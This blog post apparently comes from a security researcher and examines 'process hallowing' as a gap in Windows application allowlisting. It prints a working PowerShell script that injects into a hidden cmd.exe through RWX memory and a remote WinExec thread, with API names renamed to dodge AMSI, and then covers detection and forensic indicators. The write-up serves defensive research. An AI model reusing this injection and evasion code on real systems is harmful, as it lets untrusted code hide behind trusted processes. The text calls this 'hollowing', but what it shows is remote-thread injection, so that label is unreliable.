# Shadow Identities: A Researcher's Guide to Process Hallowing

>**Author:** Rob Shiplo - Sr Research Engineer - Systems & Endpoint Security @ Airlock Digital
>
>**Published:** March 2026 | **Platform:** Windows

---

## The "Border Control" Fallacy
In the world of Application Allowlisting (AAL), the philosophy has traditionally been straightforward: **If a binary is signed and trusted, it is allowed to run.** This approach is highly effective for stopping a user from executing an untrusted .exe downloaded from the web.

However, through my recent research, I wanted to explore a deeper question: What happens when that trusted identity, like cmd.exe or Notepad.exe, is hijacked after the "Border Control" has already let it through?

## Beyond "Good vs. Bad" Binaries
Airlock Digital is widely recognized as the gold standard in this space precisely because it goes beyond the binary choice of "good vs. bad" executables. While many tools stop at the perimeter, true security requires understanding that **trust is not a one time event.** If a security solution only checks the digital signature at the moment of execution, it is vulnerable to Process Hallowing. This is the "Shadow Identity" problem: the process has a trusted passport, but it is currently carrying out an unauthorized mission in memory.

---

## The AAL Gap: Why This Matters
Most practitioners view Process Hallowing strictly as an EDR problem because traditional Application Allowlisting (AAL) has historically been a static "Gatekeeper" focused on the disk. However, my research with HallowAirlock.sys suggests we should ask: Should runtime integrity become a core AAL concern?

The Persistence of Trust Paradox: Currently, most AAL tools validate a file only when it loads from disk. Once the process is live, the tool often "trusts" that identity implicitly. This creates a blind spot for "Stains" that appear in memory five seconds after a successful border check.

Inherited Trust: If an AAL policy trusts cmd.exe, and I successfully hallow it, I am effectively inheriting the reputation and permissions of that trusted identity. The "Passport" is real, but the "Person" carrying it has been replaced.

The Evolution of the Category: I am not suggesting that AAL should become a heavy memory scanner. Rather, I am proving that for AAL to remain the gold standard, it must evolve from "Execution Control" to "Identity Lifecycle Management."

Research Insight: During my tests, the "Stain" injection highlights that trust cannot be a one time event. Even if a tool like Airlock Digital provides the strongest perimeter on the market by stopping the "Brush" (the script), the fact that a trusted identity can be subverted at all proves that the future of AAL lies in bridging the gap between the Disk and the Runtime.

---

## The 24H2 Battleground: Lessons from the Lab
During my research on Windows 11 24H2, I discovered that Microsoft has significantly hardened the gates. My attempts to hallow different processes revealed a clear hierarchy of protection:

* **CalculatorApp.exe (The Fortress):** Modern UWP apps run in an **AppContainer.** Even when I successfully injected code, the process identity was so restricted that it could not spawn a shell or write to public folders.
* **Notepad.exe (The Hybrid):** Notepad has moved toward a more modernized architecture. I hit significant roadblocks with **Control Flow Guard (CFG)** when trying to hijack its execution flow, however usable - I wanted to do more.
* **Cmd.exe (The Classic):** This proved to be the ideal research target. As a "Medium Integrity" process without AppContainer restrictions, it allowed the hallowed identity to perform functional tasks without kernel intervention.

---

## Technical Anatomy: The Bypass
To demonstrate this, I developed a PowerShell script that interacts directly with the Windows kernel via the Win32 API. This script serves as the bridge, allowing an untrusted script to "wear the mask" of a trusted system process.

### The Research Tool: Unified Identity Breach Script
This script uses obfuscated "Gates" to bypass AMSI and perform the core stages of a hallow: Allocation, Implantation, and Execution.

```powershell
$Sig = @"
using System;
using System.Runtime.InteropServices;
public class Researcher {
    [DllImport("kernel32.dll", EntryPoint="OpenProcess")]
    public static extern IntPtr Gate1(uint a, bool b, int c);

    [DllImport("kernel32.dll", EntryPoint="VirtualAllocEx")]
    public static extern IntPtr Gate2(IntPtr a, IntPtr b, uint c, uint d, uint e);

    [DllImport("kernel32.dll", EntryPoint="WriteProcessMemory")]
    public static extern bool Gate3(IntPtr a, IntPtr b, byte[] c, uint d, out int e);

    [DllImport("kernel32.dll", EntryPoint="CreateRemoteThread")]
    public static extern IntPtr Gate4(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out uint g);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@
try { Add-Type -TypeDefinition $Sig -ErrorAction SilentlyContinue } catch {}

# 1. Targeting the Trusted Identity
$Victim = Start-Process cmd -WindowStyle Hidden -PassThru
$h = [Researcher]::Gate1(0x1F0FFF, $false, $Victim.Id)

# 2. Memory Staging
$Command = "cmd.exe /c echo Breach_Verified > C:\Users\Public\hallowed.txt"
$Bytes = [System.Text.Encoding]::ASCII.GetBytes($Command + "`0")
$p = [Researcher]::Gate2($h, [IntPtr]::Zero, [uint32]$Bytes.Length, 0x3000, 0x40)

# 3. The Implant
[Researcher]::Gate3($h, $p, $Bytes, [uint32]$Bytes.Length, [ref]0)

# 4. The Trigger
$k32 = [Researcher]::GetModuleHandle("kernel32.dll")
$func = [Researcher]::GetProcAddress($k32, "WinExec")
[Researcher]::Gate4($h, [IntPtr]::Zero, 0, $func, $p, 0, [ref]0)

Write-Host "[!] Identity Breach Successful on PID $($Victim.Id)" -ForegroundColor Green
```
## The Kernel Sentinel: HallowAirlock.sys
To validate my research, I developed a custom kernel-mode driver, `HallowAirlock.sys`. The goal was not to assist the attack, but to provide a "God View" of the VM's memory and process state that user-mode security tools often miss. 

By sitting in Ring 0, `HallowAirlock.sys` allowed me to monitor the lifecycle of the hallow from the inside out, ensuring I could verify exactly when and where the "Stain" was being applied.

### 1. Monitoring the Handover
The driver uses **PsSetCreateThreadNotifyRoutine**. This allows it to see every new thread born in the system. While an EDR might see a legitimate process like `cmd.exe` running, `HallowAirlock.sys` flags the thread the moment it starts at a suspicious, exported API like `WinExec` instead of a standard entry point.

### 2. Validating the "Stain"
Using the driver, I can perform a deep dive into the **EPROCESS** structure of the victim. By walking the Virtual Address Descriptor (VAD) tree, the driver can identify memory regions that have been modified to be executable but are not backed by a signed file on disk.

## Forensic Investigation: Proving the Breach
To verify the success of the injection, I used HallowAirlock.sys telemetry alongside Process Hacker and WinDbg to uncover the "Forensic Fingerprint" left behind by the hijacking.

### 1. The Thread "Ghost" (Process Hacker)
While monitoring the **Threads** tab in Process Hacker, I caught the exact moment of the handover. A new thread appeared that did not belong to the original process logic. 

The giveaway was the **Start Address.** Most legitimate threads in cmd.exe start within its own code or standard system workers. My hallowed thread, however, started directly at `kernel32.dll!WinExec`. This is an immediate red flag: a trusted process is suddenly birthing a thread directly into an execution API. 



Furthermore, the **Call Stack** for this thread was "shallow." In a legitimate execution, you would see a deep chain of function calls leading back to the main executable. Here, the thread was essentially "born in a vacuum," a primary indicator that the execution was forced by an external actor.

### 2. The Memory "Stain" (Process Hacker)
In the Memory tab, I identified a 4KB region marked as Private Data and RWX. This matched the telemetry from HallowAirlock.sys perfectly: it was an unmapped, executable memory segment used for staging command strings.

### 3. The 24H2 Taxonomy: Security Tier Analysis
My research across different Windows 11 24H2 processes revealed that the "Identity" I chose to hijack determined the success of the breach. This taxonomy highlights the layering of modern Windows defenses:

| Target Process | Security Tier | Result | Principal Insight |
| :--- | :--- | :--- | :--- |
| **CalculatorApp.exe** | AppContainer / UWP | **FAIL** | Restricted SID prevents hallowed thread from touching the filesystem. |
| **Notepad.exe** | CFG / Hybrid | **PARTIAL** | Control Flow Guard prevents hijacking common function return addresses. |
| **Cmd.exe** | Medium Integrity | **SUCCESS** | Standard Win32 identity allows full inheritance of user permissions. |

---

## The Airlock Encounter: Lab vs. Reality
WORKING ON!

---
## Conclusion: From Execution Control to Identity Lifecycle
While traditional allowlisting is often relegated to a static pre-execution check, my research highlights a critical architectural blind spot. If our 'Trust' is based solely on a disk-bound signature or hash, that trust becomes a weapon in the hands of a hallowing attack.

By demonstrating the 'Stain' on a live VM, I am proving that the next generation of AAL must move beyond the disk. To truly protect an identity, the allowlisting philosophy must extend into the runtime. We shouldn't just be 'Allowing an Executable'; we should be 'Authorizing a Process State'.

The "Gap" remains if you were to use a "Trusted" tool (like a vulnerable signed driver or an allowed admin tool) to perform the hallow.
